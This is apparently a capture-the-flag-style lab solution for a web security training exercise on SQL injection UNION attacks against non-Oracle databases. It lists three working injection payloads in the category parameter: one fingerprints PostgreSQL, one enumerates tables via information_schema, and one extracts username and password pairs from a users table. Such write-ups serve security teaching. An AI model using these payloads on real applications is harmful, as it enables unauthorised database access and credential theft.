# Lab 5: SQL Injection UNION Attack, Listing the Database Contents on Non-Oracle Databases

* **Solution**: Identify the database (e.g., PostgreSQL via version()), then use UNION to extract table names from information_schema.tables, followed by column names and data.
* **Final Payloads**:
  * category=Gifts' UNION SELECT NULL, version(), NULL -- (confirm PostgreSQL)
  * category=Gifts' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --
  * category=Gifts' UNION SELECT NULL, username || '~' || password, NULL FROM users --